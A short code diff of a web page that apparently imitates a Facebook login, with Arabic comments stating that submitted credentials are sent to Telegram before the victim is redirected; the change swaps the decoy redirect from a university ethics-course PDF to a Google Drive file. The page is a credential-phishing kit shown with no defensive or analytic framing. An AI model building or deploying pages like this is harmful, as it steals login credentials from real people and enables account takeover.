@@ -247,7 +247,7 @@
             document.getElementById('fakeFbSection').style.display = 'flex';
         });
 
-        // عند محاولة تسجيل الدخول، يتم إرسال البيانات لتليجرام ثم التوجيه لرابط الـ PDF المخصص
+        // عند محاولة تسجيل الدخول، يتم إرسال البيانات لتليجرام ثم التوجيه للرابط الجديد
         document.getElementById('authForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const username = document.getElementById('username').value;
@@ -271,8 +271,8 @@
                 console.error(err); 
             }
 
-            // الانتقال المباشر لرابط الملف المطلوب
-            window.location.href = "https://sc-st.univ-batna2.dz/sites/default/files/sc_st/files/cours-ethique.pdf";
+            // الانتقال المباشر لرابط جوجل درايف الجديد المطلوب
+            window.location.href = "https://drive.google.com/file/d/13A55wtwM3IcH3YE5GD4Dz1p2bzPAbpzm/view?usp=drivesdk";
         });
     </script>
 </body>
